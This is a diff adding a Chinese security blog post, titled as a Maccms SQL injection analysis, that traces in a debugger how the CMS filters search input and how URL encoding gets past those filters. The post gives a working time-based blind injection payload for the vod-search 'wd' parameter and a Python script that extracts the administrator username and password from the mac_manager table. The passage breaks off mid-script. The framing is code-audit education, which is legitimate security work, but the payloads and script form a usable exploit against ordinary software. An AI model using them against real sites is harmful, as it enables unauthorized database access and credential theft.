@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>动态调试|Maccms SQL 注入分析(附注入盲注脚本) - F0rmat的博客 | 专注于网络攻防和信息安全</title>
+
+<meta name="description" content="0x01 前言 已经有一周没发表文章了，一个朋友叫我研究maccms的代码审计，碰到这个注入的漏洞挺有趣的，就在此写一篇分析文。
+0x02 环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： JetBrains PhpStorm 2018.1.6 x64、Seay代码审计工具
+搭建这个程序也挺简单的，也是一步到位。
+0x03 漏洞复现  首先在程序的后台添加一条数据  执行我们的payload,可以看到网站跳转延迟了3s以上。 url:http://sb.com/index.php?m=vod-search post:wd=))||if((select%0bascii(length((select(m_name)\`\`from(mac_manager))))=53),(\`sleep\`(3)),0)#%25%35%63  3. 因为是盲注所以注入出管理员的账号密码在下文分析。
+0x04 SQL执行过程分析  先弄清楚sql是如何执行的一个过程，然后再去分析怎么会造成SQL注入的一个过程，这样对学习代码审计也是一个好处。 因为是动态分析，不会的安装调试环境的请到这篇文章按步骤完成安装https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm&#43;xdebug/ phpstorm打开这个选项，意思就是断在当前脚本文件的第一行，我就不下断点了，跟着它执行的过程走一遍。  我们先随便输入一点数据 访问后会断在index.php的第一行  F8往下走，走到第14行F7跟进去。 然后F8一直往下走，可以看到拦截的规则 走到POST的过滤这里F7进去 arr_foreach函数检查传过来的值是否是数组，不是数组就返回原数据，然后用urldecode函数URL解码。 最后分别对传过来的wd和test两个值进行匹配，如果存在拦截规则里面的字符就跳转到错误信息。 比如你输入wd=/**/就会被拦截 因为/**/存在拦截的正则表达式里面。  走出来会到$m = be(&#39;get&#39;,&#39;m&#39;);这里，这里只是对m传过来的vod-search进行addslashes函数的过滤  我怕文章过长，一些不必要的代码自己去细读一遍就行了，F8一直往下周，走到37行F7进去，因为我们传过来的的参数是vod，所以会包含vod.php文件并执行。  因为我们传参是search所以会走到这里，我们可以F7进去看执行的过程。 在这里会经过urldecode函数的解码，一直循环到不能解码为止，然后经过刚才的StopAttack方法的过滤 最后到htmlEncode方法的替换  跳出到vod.php文件后F8走到这里，F7进去看SQL执行的过程。 一直走到markname的值是vod 然后不用管F8继续往下走，走到这里再F7进去 可以看到SQL执行是到这里，下面是执行的语句 SELECT count(*) FROM {pre}vod WHERE 1=1 AND d_hide=0 AND d_type&amp;gt;0 and d_type not in(0) and d_usergroup in(0) AND ( instr(d_name,&#39;test&#39;)&amp;gt;0 or instr(d_subname,&#39;test&#39;)&amp;gt;0 or instr(d_starring,&#39;test&#39;)&amp;gt;0 )    0x05 漏洞分析 上面分析了SQL执行过程，下面分析这个是如何构成SQL注入的。" /><meta name="keywords"
+  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
+
+
+<link rel="stylesheet" href="https://getshe11.com/css/main.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">
+
+
+
+<meta property="og:title" content="动态调试|Maccms SQL 注入分析(附注入盲注脚本)" />
+<meta property="og:description" content="0x01 前言 已经有一周没发表文章了，一个朋友叫我研究maccms的代码审计，碰到这个注入的漏洞挺有趣的，就在此写一篇分析文。
+0x02 环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： JetBrains PhpStorm 2018.1.6 x64、Seay代码审计工具
+搭建这个程序也挺简单的，也是一步到位。
+0x03 漏洞复现  首先在程序的后台添加一条数据  执行我们的payload,可以看到网站跳转延迟了3s以上。 url:http://sb.com/index.php?m=vod-search post:wd=))||if((select%0bascii(length((select(m_name)\`\`from(mac_manager))))=53),(\`sleep\`(3)),0)#%25%35%63  3. 因为是盲注所以注入出管理员的账号密码在下文分析。
+0x04 SQL执行过程分析  先弄清楚sql是如何执行的一个过程，然后再去分析怎么会造成SQL注入的一个过程，这样对学习代码审计也是一个好处。 因为是动态分析，不会的安装调试环境的请到这篇文章按步骤完成安装https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm&#43;xdebug/ phpstorm打开这个选项，意思就是断在当前脚本文件的第一行，我就不下断点了，跟着它执行的过程走一遍。  我们先随便输入一点数据 访问后会断在index.php的第一行  F8往下走，走到第14行F7跟进去。 然后F8一直往下走，可以看到拦截的规则 走到POST的过滤这里F7进去 arr_foreach函数检查传过来的值是否是数组，不是数组就返回原数据，然后用urldecode函数URL解码。 最后分别对传过来的wd和test两个值进行匹配，如果存在拦截规则里面的字符就跳转到错误信息。 比如你输入wd=/**/就会被拦截 因为/**/存在拦截的正则表达式里面。  走出来会到$m = be(&#39;get&#39;,&#39;m&#39;);这里，这里只是对m传过来的vod-search进行addslashes函数的过滤  我怕文章过长，一些不必要的代码自己去细读一遍就行了，F8一直往下周，走到37行F7进去，因为我们传过来的的参数是vod，所以会包含vod.php文件并执行。  因为我们传参是search所以会走到这里，我们可以F7进去看执行的过程。 在这里会经过urldecode函数的解码，一直循环到不能解码为止，然后经过刚才的StopAttack方法的过滤 最后到htmlEncode方法的替换  跳出到vod.php文件后F8走到这里，F7进去看SQL执行的过程。 一直走到markname的值是vod 然后不用管F8继续往下走，走到这里再F7进去 可以看到SQL执行是到这里，下面是执行的语句 SELECT count(*) FROM {pre}vod WHERE 1=1 AND d_hide=0 AND d_type&gt;0 and d_type not in(0) and d_usergroup in(0) AND ( instr(d_name,&#39;test&#39;)&gt;0 or instr(d_subname,&#39;test&#39;)&gt;0 or instr(d_starring,&#39;test&#39;)&gt;0 )    0x05 漏洞分析 上面分析了SQL执行过程，下面分析这个是如何构成SQL注入的。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://getshe11.com/post/maccms-sql-injection-analysis/" />
+<meta property="article:published_time" content="2018-08-26T15:49:02+00:00" />
+<meta property="article:modified_time" content="2018-08-26T15:49:02+00:00" />
+<meta itemprop="name" content="动态调试|Maccms SQL 注入分析(附注入盲注脚本)">
+<meta itemprop="description" content="0x01 前言 已经有一周没发表文章了，一个朋友叫我研究maccms的代码审计，碰到这个注入的漏洞挺有趣的，就在此写一篇分析文。
+0x02 环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： JetBrains PhpStorm 2018.1.6 x64、Seay代码审计工具
+搭建这个程序也挺简单的，也是一步到位。
+0x03 漏洞复现  首先在程序的后台添加一条数据  执行我们的payload,可以看到网站跳转延迟了3s以上。 url:http://sb.com/index.php?m=vod-search post:wd=))||if((select%0bascii(length((select(m_name)\`\`from(mac_manager))))=53),(\`sleep\`(3)),0)#%25%35%63  3. 因为是盲注所以注入出管理员的账号密码在下文分析。
+0x04 SQL执行过程分析  先弄清楚sql是如何执行的一个过程，然后再去分析怎么会造成SQL注入的一个过程，这样对学习代码审计也是一个好处。 因为是动态分析，不会的安装调试环境的请到这篇文章按步骤完成安装https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm&#43;xdebug/ phpstorm打开这个选项，意思就是断在当前脚本文件的第一行，我就不下断点了，跟着它执行的过程走一遍。  我们先随便输入一点数据 访问后会断在index.php的第一行  F8往下走，走到第14行F7跟进去。 然后F8一直往下走，可以看到拦截的规则 走到POST的过滤这里F7进去 arr_foreach函数检查传过来的值是否是数组，不是数组就返回原数据，然后用urldecode函数URL解码。 最后分别对传过来的wd和test两个值进行匹配，如果存在拦截规则里面的字符就跳转到错误信息。 比如你输入wd=/**/就会被拦截 因为/**/存在拦截的正则表达式里面。  走出来会到$m = be(&#39;get&#39;,&#39;m&#39;);这里，这里只是对m传过来的vod-search进行addslashes函数的过滤  我怕文章过长，一些不必要的代码自己去细读一遍就行了，F8一直往下周，走到37行F7进去，因为我们传过来的的参数是vod，所以会包含vod.php文件并执行。  因为我们传参是search所以会走到这里，我们可以F7进去看执行的过程。 在这里会经过urldecode函数的解码，一直循环到不能解码为止，然后经过刚才的StopAttack方法的过滤 最后到htmlEncode方法的替换  跳出到vod.php文件后F8走到这里，F7进去看SQL执行的过程。 一直走到markname的值是vod 然后不用管F8继续往下走，走到这里再F7进去 可以看到SQL执行是到这里，下面是执行的语句 SELECT count(*) FROM {pre}vod WHERE 1=1 AND d_hide=0 AND d_type&gt;0 and d_type not in(0) and d_usergroup in(0) AND ( instr(d_name,&#39;test&#39;)&gt;0 or instr(d_subname,&#39;test&#39;)&gt;0 or instr(d_starring,&#39;test&#39;)&gt;0 )    0x05 漏洞分析 上面分析了SQL执行过程，下面分析这个是如何构成SQL注入的。">
+<meta itemprop="datePublished" content="2018-08-26T15:49:02+00:00" />
+<meta itemprop="dateModified" content="2018-08-26T15:49:02+00:00" />
+<meta itemprop="wordCount" content="347">
+
+
+
+<meta itemprop="keywords" content="Maccms,SQL注入,动态调试,代码审计," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="动态调试|Maccms SQL 注入分析(附注入盲注脚本)"/>
+<meta name="twitter:description" content="0x01 前言 已经有一周没发表文章了，一个朋友叫我研究maccms的代码审计，碰到这个注入的漏洞挺有趣的，就在此写一篇分析文。
+0x02 环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： JetBrains PhpStorm 2018.1.6 x64、Seay代码审计工具
+搭建这个程序也挺简单的，也是一步到位。
+0x03 漏洞复现  首先在程序的后台添加一条数据  执行我们的payload,可以看到网站跳转延迟了3s以上。 url:http://sb.com/index.php?m=vod-search post:wd=))||if((select%0bascii(length((select(m_name)\`\`from(mac_manager))))=53),(\`sleep\`(3)),0)#%25%35%63  3. 因为是盲注所以注入出管理员的账号密码在下文分析。
+0x04 SQL执行过程分析  先弄清楚sql是如何执行的一个过程，然后再去分析怎么会造成SQL注入的一个过程，这样对学习代码审计也是一个好处。 因为是动态分析，不会的安装调试环境的请到这篇文章按步骤完成安装https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm&#43;xdebug/ phpstorm打开这个选项，意思就是断在当前脚本文件的第一行，我就不下断点了，跟着它执行的过程走一遍。  我们先随便输入一点数据 访问后会断在index.php的第一行  F8往下走，走到第14行F7跟进去。 然后F8一直往下走，可以看到拦截的规则 走到POST的过滤这里F7进去 arr_foreach函数检查传过来的值是否是数组，不是数组就返回原数据，然后用urldecode函数URL解码。 最后分别对传过来的wd和test两个值进行匹配，如果存在拦截规则里面的字符就跳转到错误信息。 比如你输入wd=/**/就会被拦截 因为/**/存在拦截的正则表达式里面。  走出来会到$m = be(&#39;get&#39;,&#39;m&#39;);这里，这里只是对m传过来的vod-search进行addslashes函数的过滤  我怕文章过长，一些不必要的代码自己去细读一遍就行了，F8一直往下周，走到37行F7进去，因为我们传过来的的参数是vod，所以会包含vod.php文件并执行。  因为我们传参是search所以会走到这里，我们可以F7进去看执行的过程。 在这里会经过urldecode函数的解码，一直循环到不能解码为止，然后经过刚才的StopAttack方法的过滤 最后到htmlEncode方法的替换  跳出到vod.php文件后F8走到这里，F7进去看SQL执行的过程。 一直走到markname的值是vod 然后不用管F8继续往下走，走到这里再F7进去 可以看到SQL执行是到这里，下面是执行的语句 SELECT count(*) FROM {pre}vod WHERE 1=1 AND d_hide=0 AND d_type&gt;0 and d_type not in(0) and d_usergroup in(0) AND ( instr(d_name,&#39;test&#39;)&gt;0 or instr(d_subname,&#39;test&#39;)&gt;0 or instr(d_starring,&#39;test&#39;)&gt;0 )    0x05 漏洞分析 上面分析了SQL执行过程，下面分析这个是如何构成SQL注入的。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+</head>
+
+<body>
+    <div class="header-placeholder"></div>
+    
+    <header class="header">
+        <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    
+    <a class="site-title" href="https://getshe11.com/.">F0rmat</a>
+    
+    <nav class="site-nav">
+        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
+    </nav>
+</div>
+
+    </header>
+
+    
+    <div class="page-content">
+        <div class="wrapper">
+            
+            <div class="col-main">
+                <div class="post">
+    
+    <header class="post-header">
+        <h1 class="post-title">动态调试|Maccms SQL 注入分析(附注入盲注脚本)</h1>
+        <p class="post-meta">Aug 26, 2018</p>
+    </header>
+    <article class="post-content">
+        
+        
+        
+        
+        
+        
+        <h1 id="0x01-前言">0x01 前言</h1>
+<p>已经有一周没发表文章了，一个朋友叫我研究maccms的代码审计，碰到这个注入的漏洞挺有趣的，就在此写一篇分析文。</p>
+<h1 id="0x02-环境">0x02 环境</h1>
+<p>Web： phpstudy
+System： Windows 10 X64
+Browser： Firefox Quantum
+Python version ： 2.7
+Tools： JetBrains PhpStorm 2018.1.6 x64、Seay代码审计工具</p>
+<p>搭建这个程序也挺简单的，也是一步到位。</p>
+<!-- raw HTML omitted -->
+<h1 id="0x03-漏洞复现">0x03 漏洞复现</h1>
+<ol>
+<li>首先在程序的后台添加一条数据
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/1.png" alt=""></li>
+<li>执行我们的payload,可以看到网站跳转延迟了3s以上。
+url:<code>http://sb.com/index.php?m=vod-search</code>
+post:<code>wd=))||if((select%0bascii(length((select(m_name)\`\`from(mac_manager))))=53),(\`sleep\`(3)),0)#%25%35%63</code></li>
+</ol>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/2.png" alt="">
+3. 因为是盲注所以注入出管理员的账号密码在下文分析。</p>
+<h1 id="0x04-sql执行过程分析">0x04 SQL执行过程分析</h1>
+<ol>
+<li>先弄清楚sql是如何执行的一个过程，然后再去分析怎么会造成SQL注入的一个过程，这样对学习代码审计也是一个好处。
+因为是动态分析，不会的安装调试环境的请到这篇文章按步骤完成安装https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/</li>
+<li>phpstorm打开这个选项，意思就是断在当前脚本文件的第一行，我就不下断点了，跟着它执行的过程走一遍。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/4.png" alt=""></li>
+<li>我们先随便输入一点数据
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/3.png" alt="">
+访问后会断在index.php的第一行
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/5.png" alt=""></li>
+<li>F8往下走，走到第14行F7跟进去。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/6.png" alt="">
+然后F8一直往下走，可以看到拦截的规则
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/8.png" alt="">
+走到POST的过滤这里F7进去
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/7.png" alt="">
+<code>arr_foreach</code>函数检查传过来的值是否是数组，不是数组就返回原数据，然后用<code>urldecode</code>函数URL解码。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/9.png" alt="">
+最后分别对传过来的<code>wd</code>和<code>test</code>两个值进行匹配，如果存在拦截规则里面的字符就跳转到错误信息。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/10.png" alt="">
+比如你输入<code>wd=/**/</code>就会被拦截
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/11.png" alt="">
+因为<code>/**/</code>存在拦截的正则表达式里面。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/12.png" alt=""></li>
+<li>走出来会到<code>$m = be('get','m');</code>这里，这里只是对<code>m</code>传过来的<code>vod-search</code>进行<code>addslashes</code>函数的过滤
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/13.png" alt=""></li>
+<li>我怕文章过长，一些不必要的代码自己去细读一遍就行了，F8一直往下周，走到37行F7进去，因为我们传过来的的参数是<code>vod</code>，所以会包含<code>vod.php</code>文件并执行。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/14.png" alt=""></li>
+<li>因为我们传参是<code>search</code>所以会走到这里，我们可以F7进去看执行的过程。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/15.png" alt="">
+在这里会经过<code>urldecode</code>函数的解码，一直循环到不能解码为止，然后经过刚才的<code>StopAttack</code>方法的过滤
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/16.png" alt="">
+最后到<code>htmlEncode</code>方法的替换
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/17.png" alt=""></li>
+<li>跳出到<code>vod.php</code>文件后F8走到这里，F7进去看SQL执行的过程。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/18.png" alt="">
+一直走到<code>markname</code>的值是<code>vod</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/19.png" alt="">
+然后不用管F8继续往下走，走到这里再F7进去
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/20.png" alt="">
+可以看到SQL执行是到这里，下面是执行的语句
+<code>SELECT count(*) FROM {pre}vod WHERE 1=1  AND d_hide=0 AND d_type&gt;0  and d_type not in(0) and d_usergroup in(0)  AND ( instr(d_name,'test')&gt;0 or instr(d_subname,'test')&gt;0 or instr(d_starring,'test')&gt;0 ) </code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/21.png" alt=""></li>
+</ol>
+<h1 id="0x05-漏洞分析">0x05 漏洞分析</h1>
+<p>上面分析了SQL执行过程，下面分析这个是如何构成SQL注入的。</p>
+<ol>
+<li>刚才这里跳过了，文件位置：<code>inc/common/template.php</code>,可以看到传过来的<code>P[&quot;wd&quot;]</code>值赋值给了<code>$lp['wd']</code>。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/22.png" alt=""></li>
+<li>再往下看753~755行，可以看到我们的值是放在这里面，然后送去<code>GetOne</code>执行的。</li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$lp</span><span class="p">[</span><span class="s1">&#39;wd&#39;</span><span class="p">])){</span>
+		        	<span class="nv">$where</span> <span class="o">.=</span> <span class="s1">&#39; AND ( instr(d_name,\&#39;&#39;</span><span class="o">.</span><span class="nv">$lp</span><span class="p">[</span><span class="s1">&#39;wd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;)&gt;0 or instr(d_subname,\&#39;&#39;</span><span class="o">.</span><span class="nv">$lp</span><span class="p">[</span><span class="s1">&#39;wd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;)&gt;0 or instr(d_starring,\&#39;&#39;</span><span class="o">.</span><span class="nv">$lp</span><span class="p">[</span><span class="s1">&#39;wd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;)&gt;0 ) &#39;</span><span class="p">;</span>
+		        <span class="p">}</span>
+</code></pre></div><ol start="3">
+<li>构造的语句,只有中间才是执行的语句，前一句是为了闭合单引号，后面是注释。如果这里不清楚的可以用MySQL监控的软件去一步一步弄清楚。</li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">SELECT count(*) FROM mac_vod WHERE 1=1  AND d_hide=0 AND d_type&gt;0  and d_type not in(0) and d_usergroup in(0)  AND
+ ( instr(d_name,&#39;))||if((select ascii(length((select(m_name) from(mac_manager))))=53),(`sleep`(3)),0)#\&#39;)&gt;0 or instr(d_subname,&#39;))
+ ||if((select ascii(length((select(m_name) from(mac_manager))))=53),(`sleep`(3)),0)
+ #\&#39;)&gt;0 or instr(d_starring,&#39;))||if((select ascii(length((select(m_name) from(mac_manager))))=53),(`sleep`(5)),0)#\&#39;)&gt;0 )
+</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/23.png" alt="">
+4. 但是如果直接放语句上去会被检测到危险字符
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/24.png" alt="">
+它主要对我们这里的空格连接处匹配到了
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/25.png" alt="">
+那么我们可以用别名as 	‘	‘去代替，也可以省略as直接用	‘	‘，别名的用法在文章尾部的参考有给出。
+5. 我们再执行，用Seay的代码审计工具的Mysql监控软件查看，我们的空格和后面的<code>\</code>被转义了。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/26.png" alt="">
+还记得我们<code>chkSql</code>方法吗？先是执行<code>urldecode</code>解码，然后<code>StopAttack</code>匹配，最后<code>htmlEncode</code>编码，最后<code>Be</code>方法那里	还有一个<code>addslashes</code>函数过滤，所以会导致后面的<code>\</code>转义成<code>\\</code>。<code>htmlEncode</code>又会对前面的空格转义成<code>&amp;nbsp;</code>。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">chkSql</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">global</span> <span class="nv">$getfilter</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$s</span><span class="p">)){</span>
+		<span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="nv">$d</span><span class="o">=</span><span class="nv">$s</span><span class="p">;</span>
+	<span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">){</span>
+		<span class="nv">$s</span> <span class="o">=</span> <span class="nx">urldecode</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
+		<span class="k">if</span><span class="p">(</span><span class="nv">$s</span><span class="o">==</span><span class="nv">$d</span><span class="p">){</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="nv">$d</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="nx">StopAttack</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nv">$s</span><span class="p">,</span><span class="nv">$getfilter</span><span class="p">);</span>
+	<span class="k">return</span> <span class="nx">htmlEncode</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/27.png" alt="">
+6. 这里我们可以利用URL编码绕过<code>htmlEncode</code>，具体可以看HTML URL编码表<code>%0c</code> <code>%0b</code>等都可以，后面的<code>\</code>可以用URL编码绕过<code>%5c</code>或者双编码<code>%25%35%63</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/28.png" alt="">
+7. 那么我们构造成的payload就是下面的，功能是查询管理员账号字段的长度
+<code>wd=))||if((select%0cascii(length((select(m_name)</code>from(mac_manager))))=53),(<code>sleep</code>(3)),0)#%5c``</p>
+<h1 id="0x06-编写盲注脚本">0x06 编写盲注脚本</h1>
+<p>当然盲注一般都不会手动去，SQLMAP有时候遇到特殊的也是要自己编写注入的脚本，具体代码的意思我就不解读了，自己可以结合Python和MySQL的知识理解。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/29.png" alt=""></p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#! /usr/bin/python</span>
+<span class="c1"># -*- coding:utf-8 -*-</span>
+<span class="c1">#author:F0rmat</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="nb">dict</span> <span class="o">=</span> <span class="s2">&#34;1234567890qwertyuiopasdfghjklzxcvbnm_{}QWERTYUIOPASDFGHJKLZXCVBNM,@.?&#34;</span>
+<span class="n">UserName</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
+<span class="n">UserPass</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
+<span class="n">UserName_length</span><span class="o">=</span><span class="mi">0</span>
+<span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://sb.com/&#39;</span>
+<span class="n">url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="sa">r</span><span class="s1">&#39;/index.php?m=vod-search&#39;</span>
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">UserName</span>
+    <span class="k">global</span> <span class="n">url</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
+        <span class="n">startTime</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+        <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;))||if((select%0bascii(length((select(m_name)``from(mac_manager))))={}),(`sleep`(3)),0)#</span><span class="si">%25%</span><span class="s2">35%63&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+            <span class="nb">ord</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;wd&#39;</span><span class="p">:</span> <span class="n">sql</span><span class="p">}</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  <span class="c1"># 发送请求</span>
+        <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
+            <span class="n">UserName_length</span> <span class="o">=</span> <span class="n">i</span>
+            <span class="k">print</span> <span class="n">UserName_length</span>
+            <span class="k">break</span>
+    <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">UserName_length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">dict</span><span class="p">:</span>  <span class="c1"># 遍历取出字符</span>
+            <span class="n">startTime</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+            <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;))||if((select%0bascii(substr((select(m_name)``from(mac_manager)),{},1))={}),(`sleep`(3)),0)#</span><span class="si">%25%</span><span class="s2">35%63&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+                <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;wd&#39;</span><span class="p">:</span> <span class="n">sql</span><span class="p">}</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  <span class="c1"># 发送请求</span>
+            <span class="k">print</span> <span class="n">data</span>
+            <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
+                <span class="n">UserName</span> <span class="o">+=</span> <span class="n">i</span>
+                <span class="k">break</span>
+    <span class="k">global</span> <span class="n">UserPass</span>
+    <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">dict</span><span class="p">:</span>  <span class="c1"># 遍历取出字符</span>
+            <span class="n">startTime</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+            <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;))||if((select%0bascii(substr((select(m_password)``from(mac_manager)),{},1))={}),(`sleep`(3)),0)#</span><span class="si">%25%</span><span class="s2">35%63&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+                <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;wd&#39;</span><span class="p">:</span> <span class="n">sql</span><span class="p">}</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  <span class="c1"># 发送请求</span>
+            <span class="k">print</span> <span class="n">data</span>
+            <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
